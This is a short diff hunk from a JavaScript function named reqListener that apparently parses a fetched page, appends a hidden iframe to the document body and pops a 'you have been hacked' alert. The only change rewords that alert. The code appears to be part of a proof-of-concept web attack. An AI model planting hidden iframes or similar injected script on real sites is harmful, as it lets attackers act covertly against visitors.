@@ -62,7 +62,7 @@ function reqListener() {
         iframe.style.display = 'none';
         // Append the iframe to the document body
         document.body.appendChild(iframe);
-        alert("Lidor, you have been hacked by Itay");
+        alert("You have been hacked by Itayst");
     } else {
         console.error('Table with class "content_tbl" not found in the response.');
     }
